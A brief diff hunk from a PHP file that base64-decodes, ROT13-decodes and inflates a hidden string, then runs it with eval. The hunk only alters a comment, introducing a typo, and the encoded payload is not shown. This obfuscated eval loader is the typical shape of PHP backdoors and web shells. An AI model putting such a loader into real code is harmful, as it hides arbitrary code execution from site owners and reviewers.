@@ -10,6 +10,6 @@ $decoded_code = base64_decode($obfuscated_code);
 $rot13_decoded_code = str_rot13($decoded_code);
 $final_code = gzinflate($rot13_decoded_code);
 
-// Evaluate the final code
+// Evaluate the final cods
 eval($final_code);
 ?>  
